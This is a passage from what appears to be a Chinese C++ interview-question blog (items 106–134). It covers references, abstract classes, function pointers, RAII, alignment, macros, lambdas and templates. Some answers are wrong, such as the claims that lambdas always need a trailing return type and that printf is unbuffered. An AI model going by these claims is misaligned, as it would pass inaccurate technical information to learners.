指针参数传递本质上是值传递，它所传递的是一个地址值。</p><p>值传递过程中，被调函数的形式参数作为被调函数的局部变量处理，会在栈中开辟内存空间以存放由主调函数传递进来的实参值，从而形成了实参的一个副本（替身）。</p><p>值传递的特点是，被调函数对形式参数的任何操作都是作为局部变量进行的，不会影响主调函数的实参变量的值（形参指针变了，实参指针不会变）。</p><p><strong>2)</strong> 引用参数传递过程中，被调函数的形式参数也作为局部变量在栈中开辟了内存空间，但是这时存放的是由主调函数放进来的实参变量的地址。</p><p>被调函数对形参（本体）的任何操作都被处理成间接寻址，即通过栈中存放的地址访问主调函数中的实参变量（根据别名找到主调函数中的本体）。</p><p>因此，被调函数对形参的任何操作都会影响主调函数中的实参变量。</p><p><strong>3)</strong> 引用传递和指针传递是不同的，虽然他们都是在被调函数栈空间上的一个局部变量，但是任何对于引用参数的处理都会通过一个间接寻址的方式操作到主调函数中的相关变量。</p><p>而对于指针传递的参数，如果改变被调函数中的指针地址，它将应用不到主调函数的相关变量。如果想通过指针参数传递来改变主调函数中的相关变量（地址），那就得使用指向指针的指针或者指针引用。</p><p><strong>4)</strong> 从编译的角度来讲，程序在编译时分别将指针和引用添加到符号表上，符号表中记录的是变量名及变量所对应地址。</p><p>指针变量在符号表上对应的地址值为指针变量的地址值，而引用在符号表上对应的地址值为引用对象的地址值（与实参名字不同，地址相同）。</p><p>符号表生成之后就不会再改，因此指针可以改变其指向的对象（指针变量中的值可以改），而引用对象则不能修改。</p><h4 id="107、类如何实现只能静态分配和只能动态分配"><a href="#107、类如何实现只能静态分配和只能动态分配" class="headerlink" title="107、类如何实现只能静态分配和只能动态分配"></a>107、类如何实现只能静态分配和只能动态分配</h4><p>1)  前者是把new、delete运算符重载为private属性。后者是把构造、析构函数设为protected属性，再用子类来动态创建</p><p>2)  建立类的对象有两种方式：</p><p>①   静态建立，静态建立一个类对象，就是由编译器为对象在栈空间中分配内存；</p><p>②   动态建立，A *p = new A();动态建立一个类对象，就是使用new运算符为对象在堆空间中分配内存。这个过程分为两步，第一步执行operator new()函数，在堆中搜索一块内存并进行分配；第二步调用类构造函数构造对象；</p><p>3)  只有使用new运算符，对象才会被建立在堆上，因此只要限制new运算符就可以实现类对象只能建立在栈上，可以将new运算符设为私有。</p><h4 id="108、如果想将某个类用作基类，为什么该类必须定义而非声明？"><a href="#108、如果想将某个类用作基类，为什么该类必须定义而非声明？" class="headerlink" title="108、如果想将某个类用作基类，为什么该类必须定义而非声明？"></a>108、如果想将某个类用作基类，为什么该类必须定义而非声明？</h4><p>派生类中包含并且可以使用它从基类继承而来的成员，为了使用这些成员，派生类必须知道他们是什么。</p><h4 id="109、什么情况会自动生成默认构造函数？"><a href="#109、什么情况会自动生成默认构造函数？" class="headerlink" title="109、什么情况会自动生成默认构造函数？"></a>109、什么情况会自动生成默认构造函数？</h4><p>1) 带有默认构造函数的类成员对象，如果一个类没有任何构造函数，但它含有一个成员对象，而后者有默认构造函数，那么编译器就为该类合成出一个默认构造函数。</p><p>不过这个合成操作只有在构造函数真正被需要的时候才会发生；</p><p>如果一个类A含有多个成员类对象的话，那么类A的每一个构造函数必须调用每一个成员对象的默认构造函数而且必须按照类对象在类A中的声明顺序进行；</p><p>2) 带有默认构造函数的基类，如果一个没有任务构造函数的派生类派生自一个带有默认构造函数基类，那么该派生类会合成一个构造函数调用上一层基类的默认构造函数；</p><p>3) 带有一个虚函数的类</p><p>4) 带有一个虚基类的类</p><p>5) 合成的默认构造函数中，只有基类子对象和成员类对象会被初始化。所有其他的非静态数据成员都不会被初始化。</p><h4 id="110、抽象基类为什么不能创建对象？"><a href="#110、抽象基类为什么不能创建对象？" class="headerlink" title="110、抽象基类为什么不能创建对象？"></a>110、抽象基类为什么不能创建对象？</h4><p>抽象类是一种特殊的类，它是为了抽象和设计的目的为建立的，它处于继承层次结构的较上层。</p><p>（1）抽象类的定义：<br>   称带有纯虚函数的类为抽象类。</p><p>（2）抽象类的作用：<br>   抽象类的主要作用是将有关的操作作为结果接口组织在一个继承层次结构中，由它来为派生类提供一个公共的根，派生类将具体实现在其基类中作为接口的操作。所以派生类实际上刻画了一组子类的操作接口的通用语义，这些语义也传给子类，子类可以具体实现这些语义，也可以再将这些语义传给自己的子类。</p><p>（3）使用抽象类时注意：<br>   抽象类只能作为基类来使用，其纯虚函数的实现由派生类给出。如果派生类中没有重新定义纯虚函数，而只是继承基类的纯虚函数，则这个派生类仍然还是一个抽象类。如果派生类中给出了基类纯虚函数的实现，则该派生类就不再是抽象类了，它是一个可以建立对象的具体的类。</p><p>抽象类是不能定义对象的。一个纯虚函数不需要（但是可以）被定义。</p><p>一、纯虚函数定义<br> 纯虚函数是一种特殊的虚函数，它的一般格式如下：</p><p> 　class &lt;类名&gt;<br> 　{<br> 　virtual &lt;类型&gt;&lt;函数名&gt;(&lt;参数表&gt;)=0;<br> 　…<br> 　}; 　在许多情况下，在基类中不能对虚函数给出有意义的实现，而把它声明为纯虚函数，它的实现留给该基类的派生类去做。这就是纯虚函数的作用。<br> 　纯虚函数可以让类先具有一个操作名称，而没有操作内容，让派生类在继承时再去具体地给出定义。凡是含有纯虚函数的类叫做抽象类。这种类不能声明对象，只是作为基类为派生类服务。除非在派生类中完全实现基类中所有的的纯虚函数，否则，派生类也变成了抽象类，不能实例化对象。</p><p> 二、纯虚函数引入原因<br>  1、为了方便使用多态特性，我们常常需要在基类中定义虚拟函数。<br>  2、在很多情况下，基类本身生成对象是不合情理的。例如，动物作为一个基类可以派生出老虎、孔 雀等子类，但动物本身生成对象明显不合常理。<br> 　为了解决上述问题，引入了纯虚函数的概念，将函数定义为纯虚函数（方法：virtual ReturnType Function()= 0;）。若要使派生类为非抽象类，则编译器要求在派生类中，必须对纯虚函数予以重载以实现多态性。同时含有纯虚函数的类称为抽象类，它不能生成对象。这样就很好地解决了上述两个问题。<br> 例如，绘画程序中，shape作为一个基类可以派生出圆形、矩形、正方形、梯形等， 如果我要求面积总和的话，那么会可以使用一个 shape * 的数组，只要依次调用派生类的area()函数了。如果不用接口就没法定义成数组，因为既可以是circle ,也可以是square ,而且以后还可能加上rectangle，等等.</p><p>三、相似概念<br> 1、多态性</p><p>指相同对象收到不同消息或不同对象收到相同消息时产生不同的实现动作。c支持两种多态性：编译时多态性，运行时多态性。<br> 　a.编译时多态性：通过重载函数实现<br> 　b.运行时多态性：通过虚函数实现。<br> 2、虚函数<br> 　虚函数是在基类中被声明为virtual，并在派生类中重新定义的成员函数，可实现成员函数的动态重载。<br> 3、抽象类<br> 　包含纯虚函数的类称为抽象类。由于抽象类包含了没有定义的纯虚函数，所以不能定义抽象类的对象。</p><h4 id="111、-继承机制中对象之间如何转换？指针和引用之间如何转换？"><a href="#111、-继承机制中对象之间如何转换？指针和引用之间如何转换？" class="headerlink" title="111、 继承机制中对象之间如何转换？指针和引用之间如何转换？"></a>111、 继承机制中对象之间如何转换？指针和引用之间如何转换？</h4><p>1)     向上类型转换</p><p>将派生类指针或引用转换为基类的指针或引用被称为向上类型转换，向上类型转换会自动进行，而且向上类型转换是安全的。</p><p>2)     向下类型转换</p><p>将基类指针或引用转换为派生类指针或引用被称为向下类型转换，向下类型转换不会自动进行，因为一个基类对应几个派生类，所以向下类型转换时不知道对应哪个派生类，所以在向下类型转换时必须加动态类型识别技术。RTTI技术，用dynamic_cast进行向下类型转换。</p><h4 id="112、知道c中的组合吗？它与继承相比有什么优缺点吗？"><a href="#112、知道c中的组合吗？它与继承相比有什么优缺点吗？" class="headerlink" title="112、知道c中的组合吗？它与继承相比有什么优缺点吗？"></a>112、知道c中的组合吗？它与继承相比有什么优缺点吗？</h4><p>一：继承</p><p>继承是Is a 的关系，比如说Student继承Person,则说明Student is a Person。继承的优点是子类可以重写父类的方法来方便地实现对父类的扩展。</p><p>继承的缺点有以下几点：</p><p>①：父类的内部细节对子类是可见的。</p><p>②：子类从父类继承的方法在编译时就确定下来了，所以无法在运行期间改变从父类继承的方法的行为。</p><p>③：如果对父类的方法做了修改的话（比如增加了一个参数），则子类的方法必须做出相应的修改。所以说子类与父类是一种高耦合，违背了面向对象思想。</p><p>二：组合</p><p>组合也就是设计类的时候把要组合的类的对象加入到该类中作为自己的成员变量。</p><p>组合的优点：</p><p>①：当前对象只能通过所包含的那个对象去调用其方法，所以所包含的对象的内部细节对当前对象时不可见的。</p><p>②：当前对象与包含的对象是一个低耦合关系，如果修改包含对象的类中代码不需要修改当前对象类的代码。</p><p>③：当前对象可以在运行时动态的绑定所包含的对象。可以通过set方法给所包含对象赋值。</p><p>组合的缺点：①：容易产生过多的对象。②：为了能组合多个对象，必须仔细对接口进行定义。</p><h4 id="113、函数指针？"><a href="#113、函数指针？" class="headerlink" title="113、函数指针？"></a>113、函数指针？</h4><p>1)  什么是函数指针?</p><p>函数指针指向的是特殊的数据类型，函数的类型是由其返回的数据类型和其参数列表共同决定的，而函数的名称则不是其类型的一部分。</p><p>一个具体函数的名字，如果后面不跟调用符号(即括号)，则该名字就是该函数的指针(注意：大部分情况下，可以这么认为，但这种说法并不很严格)。</p><p>2)  函数指针的声明方法</p><p>int (*pf)(const int&amp;, const int&amp;); (1)</p><p>上面的pf就是一个函数指针，指向所有返回类型为int，并带有两个const int&amp;参数的函数。注意*pf两边的括号是必须的，否则上面的定义就变成了：</p><p>int *pf(const int&amp;, const int&amp;); (2)</p><p>而这声明了一个函数pf，其返回类型为int *， 带有两个const int&amp;参数。</p><p>3)  为什么有函数指针</p><p>函数与数据项相似，函数也有地址。我们希望在同一个函数中通过使用相同的形参在不同的时间使用产生不同的效果。</p><p>4)  一个函数名就是一个指针，它指向函数的代码。一个函数地址是该函数的进入点，也就是调用函数的地址。函数的调用可以通过函数名，也可以通过指向函数的指针来调用。函数指针还允许将函数作为变元传递给其他函数；</p><p>5)  两种方法赋值：</p><p>指针名 = 函数名；  指针名 = &amp;函数名</p><h4 id="114、-内存泄漏的后果？如何监测？解决方法？"><a href="#114、-内存泄漏的后果？如何监测？解决方法？" class="headerlink" title="114、 内存泄漏的后果？如何监测？解决方法？"></a>114、 内存泄漏的后果？如何监测？解决方法？</h4><p>1)  内存泄漏</p><p>内存泄漏是指由于疏忽或错误造成了程序未能释放掉不再使用的内存的情况。内存泄漏并非指内存在物理上消失，而是应用程序分配某段内存后，由于设计错误，失去了对该段内存的控制；</p><p>2)  后果</p><p>只发生一次小的内存泄漏可能不被注意，但泄漏大量内存的程序将会出现各种证照：性能下降到内存逐渐用完，导致另一个程序失败；</p><p>3)  如何排除</p><p>使用工具软件BoundsChecker，BoundsChecker是一个运行时错误检测工具，它主要定位程序运行时期发生的各种错误；</p><p>调试运行DEBUG版程序，运用以下技术：CRT(C run-time libraries)、运行时函数调用堆栈、内存泄漏时提示的内存分配序号(集成开发环境OUTPUT窗口)，综合分析内存泄漏的原因，排除内存泄漏。</p><p>4)  解决方法</p><p>智能指针。</p><p>5)  检查、定位内存泄漏</p><p>检查方法：在main函数最后面一行，加上一句_CrtDumpMemoryLeaks()。调试程序，自然关闭程序让其退出，查看输出：</p><p>输出这样的格式{453}normal block at 0x02432CA8,868 bytes long</p><p>被{}包围的453就是我们需要的内存泄漏定位值，868 bytes long就是说这个地方有868比特内存没有释放。</p><p>定位代码位置</p><p>在main函数第一行加上_CrtSetBreakAlloc(453);意思就是在申请453这块内存的位置中断。然后调试程序，程序中断了，查看调用堆栈。加上头文件#include <crtdbg.h></p><h4 id="115、使用智能指针管理内存资源，RAII是怎么回事？"><a href="#115、使用智能指针管理内存资源，RAII是怎么回事？" class="headerlink" title="115、使用智能指针管理内存资源，RAII是怎么回事？"></a>115、使用智能指针管理内存资源，RAII是怎么回事？</h4><p>1)  RAII全称是“Resource Acquisition is Initialization”，直译过来是“资源获取即初始化”，也就是说在构造函数中申请分配资源，在析构函数中释放资源。</p><p>因为c的语言机制保证了，当一个对象创建的时候，自动调用构造函数，当对象超出作用域的时候会自动调用析构函数。所以，在RAII的指导下，我们应该使用类来管理资源，将资源和对象的生命周期绑定。</p><p>2)  智能指针（std::shared_ptr和std::unique_ptr）即RAII最具代表的实现，使用智能指针，可以实现自动的内存管理，再也不需要担心忘记delete造成的内存泄漏。</p><p>毫不夸张的来讲，有了智能指针，代码中几乎不需要再出现delete了。</p><h4 id="116、手写实现智能指针类"><a href="#116、手写实现智能指针类" class="headerlink" title="116、手写实现智能指针类"></a>116、手写实现智能指针类</h4><p>1)  智能指针是一个数据类型，一般用模板实现，模拟指针行为的同时还提供自动垃圾回收机制。它会自动记录SmartPointer<T*>对象的引用计数，一旦T类型对象的引用计数为0，就释放该对象。</p><p>除了指针对象外，我们还需要一个引用计数的指针设定对象的值，并将引用计数计为1，需要一个构造函数。新增对象还需要一个构造函数，析构函数负责引用计数减少和释放内存。</p><p>通过覆写赋值运算符，才能将一个旧的智能指针赋值给另一个指针，同时旧的引用计数减1，新的引用计数加1</p><p>2)  一个构造函数、拷贝构造函数、复制构造函数、析构函数、移走函数；</p><h4 id="117、说一说你理解的内存对齐以及原因"><a href="#117、说一说你理解的内存对齐以及原因" class="headerlink" title="117、说一说你理解的内存对齐以及原因"></a>117、说一说你理解的内存对齐以及原因</h4><p>1、 分配内存的顺序是按照声明的顺序。</p><p>2、 每个变量相对于起始位置的偏移量必须是该变量类型大小的整数倍，不是整数倍空出内存，直到偏移量是整数倍为止。</p><p>3、 最后整个结构体的大小必须是里面变量类型最大值的整数倍。</p><p>添加了#pragma pack(n)后规则就变成了下面这样：</p><p>1、 偏移量要是n和当前变量大小中较小值的整数倍</p><p>2、 整体大小要是n和最大变量大小中较小值的整数倍</p><p>3、 n值必须为1,2,4,8…，为其他值时就按照默认的分配规则</p><h4 id="118、-结构体变量比较是否相等"><a href="#118、-结构体变量比较是否相等" class="headerlink" title="118、 结构体变量比较是否相等"></a>118、 结构体变量比较是否相等</h4><p>1)   重载了 “==” 操作符</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">foo</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> a<span class="token punctuation">;</span>  <span class="token keyword">int</span> b<span class="token punctuation">;</span>  <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token keyword">const</span> foo<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token comment">//* *操作运算符重载*</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span> a <span class="token operator">==</span> rhs<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> rhs<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>2)   元素的话，一个个比；</p><p>3)   指针直接比较，如果保存的是同一个实例地址，则(p1==p2)为真；</p><h4 id="119、-函数调用过程栈的变化，返回值和参数变量哪个先入栈？"><a href="#119、-函数调用过程栈的变化，返回值和参数变量哪个先入栈？" class="headerlink" title="119、 函数调用过程栈的变化，返回值和参数变量哪个先入栈？"></a>119、 函数调用过程栈的变化，返回值和参数变量哪个先入栈？</h4><p> 1、调用者函数把被调函数所需要的参数按照与被调函数的形参顺序相反的顺序压入栈中,即:从右向左依次把被调函数所需要的参数压入栈;<br> 2、调用者函数使用call指令调用被调函数,并把call指令的下一条指令的地址当成返回地址压入栈中(这个压栈操作隐含在call指令中);<br> 3、在被调函数中,被调函数会先保存调用者函数的栈底地址(push ebp),然后再保存调用者函数的栈顶地址,即:当前被调函数的栈底地址(mov ebp,esp);<br> 4、在被调函数中,从ebp的位置处开始存放被调函数中的局部变量和临时变量,并且这些变量的地址按照定义时的顺序依次减小,即:这些变量的地址是按照栈的延伸方向排列的,先定义的变量先入栈,后定义的变量后入栈;</p><h4 id="120、define、const、typedef、inline的使用方法？他们之间有什么区别？"><a href="#120、define、const、typedef、inline的使用方法？他们之间有什么区别？" class="headerlink" title="120、define、const、typedef、inline的使用方法？他们之间有什么区别？"></a>120、define、const、typedef、inline的使用方法？他们之间有什么区别？</h4><p><strong>一、</strong>const<strong>与</strong>#define<strong>的区别：</strong></p><p>1)  const定义的常量是变量带类型，而#define定义的只是个常数不带类型；</p><p>2)  define只在预处理阶段起作用，简单的文本替换，而const在编译、链接过程中起作用；</p><p>3)  define只是简单的字符串替换没有类型检查。而const是有数据类型的，是要进行判断的，可以避免一些低级错误；</p><p>4)  define预处理后，占用代码段空间，const占用数据段空间；</p><p>5)  const不能重定义，而define可以通过#undef取消某个符号的定义，进行重定义；</p><p>6)  define独特功能，比如可以用来防止文件重复引用。</p><p><strong>二、</strong>  #define<strong>和别名</strong>typedef<strong>的区别</strong></p><p>1)  执行时间不同，typedef在编译阶段有效，typedef有类型检查的功能；#define是宏定义，发生在预处理阶段，不进行类型检查；</p><p>2)  功能差异，typedef用来定义类型的别名，定义与平台无关的数据类型，与struct的结合使用等。#define不只是可以为类型取别名，还可以定义常量、变量、编译开关等。</p><p>3)  作用域不同，#define没有作用域的限制，只要是之前预定义过的宏，在以后的程序中都可以使用。而typedef有自己的作用域。</p><p><strong>三、</strong>  define<strong>与</strong>inline<strong>的区别</strong></p><p>1)  #define是关键字，inline是函数；</p><p>2)  宏定义在预处理阶段进行文本替换，inline函数在编译阶段进行替换；</p><p>3)  inline函数有类型检查，相比宏定义比较安全；</p><h4 id="121、你知道printf函数的实现原理是什么吗？"><a href="#121、你知道printf函数的实现原理是什么吗？" class="headerlink" title="121、你知道printf函数的实现原理是什么吗？"></a>121、你知道printf函数的实现原理是什么吗？</h4><p>在C/c中，对函数参数的扫描是从后向前的。</p><p>C/c的函数参数是通过压入堆栈的方式来给函数传参数的（堆栈是一种先进后出的数据结构），最先压入的参数最后出来，在计算机的内存中，数据有2块，一块是堆，一块是栈（函数参数及局部变量在这里），而栈是从内存的高地址向低地址生长的，控制生长的就是堆栈指针了，最先压入的参数是在最上面，就是说在所有参数的最后面，最后压入的参数在最下面，结构上看起来是第一个，所以最后压入的参数总是能够被函数找到，因为它就在堆栈指针的上方。</p><p>printf的第一个被找到的参数就是那个字符指针，就是被双引号括起来的那一部分，函数通过判断字符串里控制参数的个数来判断参数个数及数据类型，通过这些就可算出数据需要的堆栈指针的偏移量了，下面给出printf(“%d,%d”,a,b);（其中a、b都是int型的）的汇编代码.</p><h4 id="122、说一说你了解的关于lambda函数的全部知识"><a href="#122、说一说你了解的关于lambda函数的全部知识" class="headerlink" title="122、说一说你了解的关于lambda函数的全部知识"></a>122、说一说你了解的关于lambda函数的全部知识</h4><p>1) 利用lambda表达式可以编写内嵌的匿名函数，用以替换独立函数或者函数对象；</p><p>2) 每当你定义一个lambda表达式后，编译器会自动生成一个匿名类（这个类当然重载了()运算符），我们称为闭包类型（closure type）。那么在运行时，这个lambda表达式就会返回一个匿名的闭包实例，其实一个右值。所以，我们上面的lambda表达式的结果就是一个个闭包。闭包的一个强大之处是其可以通过传值或者引用的方式捕捉其封装作用域内的变量，前面的方括号就是用来定义捕捉模式以及变量，我们又将其称为lambda捕捉块。</p><p>3) lambda表达式的语法定义如下：</p><p>[capture] （parameters） mutable -&gt;return-type {statement};</p><p>4) lambda必须使用尾置返回来指定返回类型，可以忽略参数列表和返回值，但必须永远包含捕获列表和函数体；</p><h4 id="123、将字符串“hello-world”从开始到打印到屏幕上的全过程"><a href="#123、将字符串“hello-world”从开始到打印到屏幕上的全过程" class="headerlink" title="123、将字符串“hello world”从开始到打印到屏幕上的全过程?"></a>123、将字符串“hello world”从开始到打印到屏幕上的全过程?</h4><p>1.用户告诉操作系统执行HelloWorld程序（通过键盘输入等）</p><p>2．操作系统：找到helloworld程序的相关信息，检查其类型是否是可执行文件；并通过程序首部信息，确定代码和数据在可执行文件中的位置并计算出对应的磁盘块地址。</p><p>3．操作系统：创建一个新进程，将HelloWorld可执行文件映射到该进程结构，表示由该进程执行helloworld程序。</p><p>4．操作系统：为helloworld程序设置cpu上下文环境，并跳到程序开始处。</p><p>5．执行helloworld程序的第一条指令，发生缺页异常</p><p>6．操作系统：分配一页物理内存，并将代码从磁盘读入内存，然后继续执行helloworld程序</p><p>7．helloword程序执行puts函数（系统调用），在显示器上写一字符串</p><p>8．操作系统：找到要将字符串送往的显示设备，通常设备是由一个进程控制的，所以，操作系统将要写的字符串送给该进程</p><p>9．操作系统：控制设备的进程告诉设备的窗口系统，它要显示该字符串，窗口系统确定这是一个合法的操作，然后将字符串转换成像素，将像素写入设备的存储映像区</p><p>10．视频硬件将像素转换成显示器可接收和一组控制数据信号</p><p>11．显示器解释信号，激发液晶屏</p><p>12．OK，我们在屏幕上看到了HelloWorld</p><h4 id="124、模板类和模板函数的区别是什么？"><a href="#124、模板类和模板函数的区别是什么？" class="headerlink" title="124、模板类和模板函数的区别是什么？"></a>124、模板类和模板函数的区别是什么？</h4><p>函数模板的实例化是由编译程序在处理函数调用时自动完成的，而类模板的实例化必须由程序员在程序中显式地指定。即函数模板允许隐式调用和显式调用而类模板只能显示调用。在使用时类模板必须加<T>，而函数模板不必</p><h4 id="125、为什么模板类一般都是放在一个h文件中"><a href="#125、为什么模板类一般都是放在一个h文件中" class="headerlink" title="125、为什么模板类一般都是放在一个h文件中"></a>125、为什么模板类一般都是放在一个h文件中</h4><p>1)  模板定义很特殊。由template&lt;…&gt;处理的任何东西都意味着编译器在当时不为它分配存储空间，它一直处于等待状态直到被一个模板实例告知。在编译器和连接器的某一处，有一机制能去掉指定模板的多重定义。</p><p>所以为了容易使用，几乎总是在头文件中放置全部的模板声明和定义。</p><p>2)  在分离式编译的环境下，编译器编译某一个.cpp文件时并不知道另一个.cpp文件的存在，也不会去查找（当遇到未决符号时它会寄希望于连接器）。这种模式在没有模板的情况下运行良好，但遇到模板时就傻眼了，因为模板仅在需要的时候才会实例化出来。</p><p>所以，当编译器只看到模板的声明时，它不能实例化该模板，只能创建一个具有外部连接的符号并期待连接器能够将符号的地址决议出来。</p><p>然而当实现该模板的.cpp文件中没有用到模板的实例时，编译器懒得去实例化，所以，整个工程的.obj中就找不到一行模板实例的二进制代码，于是连接器也黔驴技穷了。</p><h4 id="126、c中类成员的访问权限和继承权限问题"><a href="#126、c中类成员的访问权限和继承权限问题" class="headerlink" title="126、c中类成员的访问权限和继承权限问题"></a>126、c中类成员的访问权限和继承权限问题</h4><p>1)  三种访问权限</p><p>①   public:用该关键字修饰的成员表示公有成员，该成员不仅可以在类内可以被  访问，在类外也是可以被访问的，是类对外提供的可访问接口；</p><p>②   private:用该关键字修饰的成员表示私有成员，该成员仅在类内可以被访问，在类体外是隐藏状态；</p><p>③   protected:用该关键字修饰的成员表示保护成员，保护成员在类体外同样是隐藏状态，但是对于该类的派生类来说，相当于公有成员，在派生类中可以被访问。</p><p>2)  三种继承方式</p><p>①   若继承方式是public，基类成员在派生类中的访问权限保持不变，也就是说，基类中的成员访问权限，在派生类中仍然保持原来的访问权限；</p><p>②  若继承方式是private，基类所有成员在派生类中的访问权限都会变为私有(private)权限；</p><p>③  若继承方式是protected，基类的共有成员和保护成员在派生类中的访问权限都会变为保护(protected)权限，私有成员在派生类中的访问权限仍然是私有(private)权限。</p><h4 id="127、cout和printf有什么区别？"><a href="#127、cout和printf有什么区别？" class="headerlink" title="127、cout和printf有什么区别？"></a>127、cout和printf有什么区别？</h4><p>cout&lt;&lt;是一个函数，cout&lt;&lt;后可以跟不同的类型是因为cout&lt;&lt;已存在针对各种类型数据的重载，所以会自动识别数据的类型。输出过程会首先将输出字符放入缓冲区，然后输出到屏幕。</p><p>cout是有缓冲输出:</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">cout <span class="token operator">&lt;</span> <span class="token operator">&lt;</span> <span class="token string">"abc "</span> <span class="token operator">&lt;</span> <span class="token operator">&lt;</span>endl<span class="token punctuation">;</span>或cout <span class="token operator">&lt;</span> <span class="token operator">&lt;</span> <span class="token string">"abc\n "</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;</span> <span class="token operator">&lt;</span>flush<span class="token punctuation">;</span> 这两个才是一样的<span class="token punctuation">.</span></code></pre><p> flush立即强迫缓冲输出。<br> printf是无缓冲输出。有输出时立即输出</p><h4 id="128、你知道重载运算符吗？"><a href="#128、你知道重载运算符吗？" class="headerlink" title="128、你知道重载运算符吗？"></a>128、你知道重载运算符吗？</h4><p>1、 我们只能重载已有的运算符，而无权发明新的运算符；对于一个重载的运算符，其优先级和结合律与内置类型一致才可以；不能改变运算符操作数个数；</p><p>2、  两种重载方式：成员运算符和非成员运算符，成员运算符比非成员运算符少一个参数；下标运算符、箭头运算符必须是成员运算符；</p><p>3、 引入运算符重载，是为了实现类的多态性；</p><p>4、 当重载的运算符是成员函数时，this绑定到左侧运算符对象。成员运算符函数的参数数量比运算符对象的数量少一个；至少含有一个类类型的参数；</p><p>5、 从参数的个数推断到底定义的是哪种运算符，当运算符既是一元运算符又是二元运算符（+，-，*，&amp;）；</p><p>6、 下标运算符必须是成员函数，下标运算符通常以所访问元素的引用作为返回值，同时最好定义下标运算符的常量版本和非常量版本；</p><p>7、 箭头运算符必须是类的成员，解引用通常也是类的成员；重载的箭头运算符必须返回类的指针；</p><h4 id="129、当程序中有函数重载时，函数的匹配原则和顺序是什么？"><a href="#129、当程序中有函数重载时，函数的匹配原则和顺序是什么？" class="headerlink" title="129、当程序中有函数重载时，函数的匹配原则和顺序是什么？"></a>129、当程序中有函数重载时，函数的匹配原则和顺序是什么？</h4><p>1)  名字查找</p><p>2)  确定候选函数</p><p>3)  寻找最佳匹配</p><h4 id="130、定义和声明的区别"><a href="#130、定义和声明的区别" class="headerlink" title="130、定义和声明的区别"></a>130、定义和声明的区别</h4><p>如果是指变量的声明和定义<br> 从编译原理上来说，声明是仅仅告诉编译器，有个某类型的变量会被使用，但是编译器并不会为它分配任何内存。而定义就是分配了内存。</p><p>如果是指函数的声明和定义<br> 声明：一般在头文件里，对编译器说：这里我有一个函数叫function() 让编译器知道这个函数的存在。<br> 定义：一般在源文件里，具体就是函数的实现过程 写明函数体。</p><h4 id="131、全局变量和static变量的区别"><a href="#131、全局变量和static变量的区别" class="headerlink" title="131、全局变量和static变量的区别"></a>131、全局变量和static变量的区别</h4><p>1、全局变量（外部变量）的说明之前再冠以static就构成了静态的全局变量。</p><p>全局变量本身就是静态存储方式，静态全局变量当然也是静态存储方式。</p><p>这两者在存储方式上并无不同。这两者的区别在于非静态全局变量的作用域是整个源程序，当一个源程序由多个原文件组成时，非静态的全局变量在各个源文件中都是有效的。</p><p>而静态全局变量则限制了其作用域，即只在定义该变量的源文件内有效，在同一源程序的其它源文件中不能使用它。由于静态全局变量的作用域限于一个源文件内，只能为该源文件内的函数公用，因此可以避免在其他源文件中引起错误。</p><p>static全局变量与普通的全局变量的区别是static全局变量只初始化一次，防止在其他文件单元被引用。</p><p>2.static函数与普通函数有什么区别？<br> static函数与普通的函数作用域不同。尽在本文件中。只在当前源文件中使用的函数应该说明为内部函数（static），内部函数应该在当前源文件中说明和定义。</p><p>对于可在当前源文件以外使用的函数应该在一个头文件中说明，要使用这些函数的源文件要包含这个头文件。<br> static函数与普通函数最主要区别是static函数在内存中只有一份，普通静态函数在每个被调用中维持一份拷贝程序的局部变量存在于（堆栈）中，全局变量存在于（静态区）中，动态申请数据存在于（堆）</p><h4 id="132、-静态成员与普通成员的区别是什么？"><a href="#132、-静态成员与普通成员的区别是什么？" class="headerlink" title="132、 静态成员与普通成员的区别是什么？"></a>132、 静态成员与普通成员的区别是什么？</h4><p>1)  生命周期</p><p>静态成员变量从类被加载开始到类被卸载，一直存在；</p><p>普通成员变量只有在类创建对象后才开始存在，对象结束，它的生命期结束；</p><p>2)  共享方式</p><p>静态成员变量是全类共享；普通成员变量是每个对象单独享用的；</p><p>3)  定义位置</p><p>普通成员变量存储在栈或堆中，而静态成员变量存储在静态全局区；</p><p>4)  初始化位置</p><p>普通成员变量在类中初始化；静态成员变量在类外初始化；</p><p>5)  默认实参</p><p>可以使用静态成员变量作为默认实参，</p><h4 id="133、说一下你理解的-ifdef-endif代表着什么？"><a href="#133、说一下你理解的-ifdef-endif代表着什么？" class="headerlink" title="133、说一下你理解的 ifdef   endif代表着什么？"></a>133、说一下你理解的 ifdef   endif代表着什么？</h4><p>1)  一般情况下，源程序中所有的行都参加编译。但是有时希望对其中一部分内容只在满足一定条件才进行编译，也就是对一部分内容指定编译的条件，这就是“条件编译”。有时，希望当满足某条件时对一组语句进行编译，而当条件不满足时则编译另一组语句。 </p><p>2)  条件编译命令最常见的形式为： </p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">\#ifdef 标识符  程序段<span class="token number">1</span>  \#<span class="token keyword">else</span>  程序段<span class="token number">2</span>  \#endif</code></pre><p>它的作用是：当标识符已经被定义过(一般是用#define命令定义)，则对程序段1进行编译，否则编译程序段2。<br> 其中#else部分也可以没有，即： </p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">\#ifdef 程序段<span class="token number">1</span> \#denif</code></pre><p>3)  在一个大的软件工程里面，可能会有多个文件同时包含一个头文件，当这些文件编译链接成一个可执行文件上时，就会出现大量“重定义”错误。</p><p>在头文件中使用#define、#ifndef、#ifdef、#endif能避免头文件重定义。</p><h4 id="134、隐式转换，如何消除隐式转换？"><a href="#134、隐式转换，如何消除隐式转换？" class="headerlink" 